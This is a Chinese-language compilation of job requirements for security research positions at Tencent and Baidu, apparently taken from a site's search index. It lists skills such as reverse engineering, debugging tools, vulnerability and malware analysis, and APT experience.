熟悉各类黑产攻击方式和应对策略，有深入分析漏洞利用/病毒/数据安全等一种或多种领域经验； 3年以上企业安全行业工作经验，熟悉企业安全产品功能架构，能分析行业定制相应产品策略； 有apt攻防经验者优先。 腾讯(系统安全研究员（北京）) 对信息安全研究有浓厚的兴趣； 熟练掌握 Windows、Linux、Android、iOS、Windows Phone 中任何一个平台上的逆向分析技术，包括应用层和内核； 能熟练使用任何一门系统编程语言（如C/C++）和一门脚本语言（如Python）； 熟悉至少三种常用网络协议，能熟练使用协议分析软件； 熟练阅读英文资料； 两年以上安全漏洞相关研究经验。 腾讯(安全研究员（深圳）) 熟练掌握汇编代码，熟练使用od，windbg等调试工具； 熟悉浏览器，Office等漏洞的攻击原理，漏洞缓解机制及绕过方法，有写过完整的漏洞利用代码更佳； 熟悉病毒木马的危害和技术手段，以及病毒和杀软的相互对抗，有分析过rootkit，bootkit，APT攻击样本更佳； 熟练掌握至少一门开发语言，有大型安全软件开发经验更佳； 有在甲方或乙方为大型企业提供安全服务的工作经历更佳； 具备良好的沟通能力，语言表达能力和文档化能力。 百度 熟悉病毒木马常用技术手段 熟悉Windows操作系统原理和相关的安全机制。 熟悉W32汇编语言，熟练使用OD，IDA等调试器（有逆向经验者优先）； 熟悉C\C++\Python\PHP或脚本类语言，具有一定的编程能力 熟悉PE结构，了解文件加载运行机制； 喜欢安全领域，虚心好学； 有较好的团队合作和吃苦耐劳精神，能承受一定的工作压力]]></content>
    </entry>

    
  
  
</search>
